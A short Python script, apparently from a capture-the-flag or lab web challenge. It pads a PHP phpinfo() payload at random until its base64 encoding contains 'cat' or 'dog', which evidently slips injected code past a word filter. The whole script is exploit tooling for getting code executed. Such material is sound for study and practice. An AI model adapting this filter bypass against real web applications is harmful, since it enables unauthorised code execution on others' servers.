import base64
import string
import random

payload = "<?php phpinfo(); echo '"

padding = ""

while True:
    full_payload = payload + padding + "' ?>"

    print(f"Trying '{full_payload}'")
    encoded = base64.b64encode(full_payload.encode('utf-8'))

    encoded = encoded.decode('utf-8')

    if 'cat' in encoded or 'dog' in encoded:
        break

    padding += random.choice(string.ascii_letters)
    if len(padding) > 800:
        padding = ""

print(encoded)
